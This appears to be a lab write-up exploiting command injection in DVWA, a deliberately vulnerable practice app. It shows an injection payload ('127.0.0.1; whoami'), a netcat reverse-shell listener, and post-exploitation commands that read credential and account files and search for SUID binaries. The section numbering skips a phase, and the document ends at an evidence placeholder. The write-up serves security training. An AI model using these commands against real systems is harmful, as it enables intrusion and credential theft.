## Phase 1 — Recon: confirming the command injection vulnerability

The DVWA Command Injection module presents a simple form that asks for an IP
address and runs a `ping` against it. Before assuming this is exploitable,
the first step is confirming that user input is actually being passed
unsanitized to a shell command, rather than being validated as a real IP
address first.

First, a normal, expected input to establish a baseline:

```
127.0.0.1
```

<img width="655" height="496" alt="image" src="https://github.com/user-attachments/assets/e56b2ac2-550f-45ab-b048-893520ff5c7f" />

This returns the expected `ping` output for localhost — confirming the
backend really does execute a system `ping` command rather than, say, using a
built-in network library. Next, append a shell metacharacter to chain a
second, unrelated command onto the input:

```
127.0.0.1; whoami
```

<details>
<summary>Payload explained</summary>

| Part | What it does |
|---|---|
| `127.0.0.1` | The expected, valid input — keeps the first command running normally so the page doesn't just error out |
| `;` | Shell command separator — on Linux, this terminates the first command and starts a new one, regardless of whether the first command succeeded |
| `whoami` | An arbitrary OS command with no relation to `ping` — if its output appears on the page, user input is being passed directly to a shell with no sanitization |

</details>

<img width="280" height="159" alt="image" src="https://github.com/user-attachments/assets/58cae92c-e6c6-4d71-9e9e-1f2f457f3752" />

If the page returns both the `ping` output **and** the result of `whoami`,
this confirms the vulnerability: the application is building a shell command
by directly concatenating user input, with no input validation or
sanitization at all. This is a classic OS Command Injection vulnerability
(CWE-78) — anything the web server's user account can run, an attacker can
now run too.

First, start a listener on Kali: `nc -lvnp 4444`

| Part | What it does |
|---|---|
| `nc` | Netcat — used here to catch an incoming reverse shell connection |
| `-l` | Listen mode — waits for an incoming connection instead of initiating one |
| `-v` |Verbose — prints connection status |
| `-n` |Skips DNS resolution |
| `-p 4444	` |Listens on port 4444 |

## Phase 3 — Enumeration for privilege escalation

With code execution established, the next step is looking for a way to
escalate beyond the low-privilege `www-data` account this shell is running
as. Rather than attempting a specific exploit blindly, enumeration starts
broad: check for sudo rights, readable files with embedded credentials, and
basic situational awareness of the box.

```
sudo -l
```

<details>
<summary>Command explained</summary>

| Part | What it does |
|---|---|
| `sudo -l` | Lists any commands the current user is allowed to run as another user (often root) via `sudo` — a common and very direct path to privilege escalation if misconfigured |

</details>

```
cat /var/www/html/config/config.inc.php
```

<details>
<summary>Command explained</summary>

| Part | What it does |
|---|---|
| `cat /var/www/html/config/config.inc.php` | DVWA's own database configuration file — commonly contains the database username/password in plaintext, which may be reused elsewhere on the network |

</details>

```
find / -perm -4000 -type f 2>/dev/null
```

<details>
<summary>Command explained</summary>

| Part | What it does |
|---|---|
| `find / -perm -4000 -type f` | Searches the entire filesystem for files with the SUID bit set — programs that run with the file owner's privileges (often root) regardless of who executes them, a classic local privilege escalation vector |
| `2>/dev/null` | Suppresses permission-denied errors from directories this low-privilege user can't read |

</details>

```
cat /etc/passwd
```

<details>
<summary>Command explained</summary>

| Part | What it does |
|---|---|
| `cat /etc/passwd` | Lists all local user accounts on the system — useful for understanding what accounts exist and which have real login shells vs. service accounts |

</details>

Placeholder `evidence/04-enumeration-results.png`.
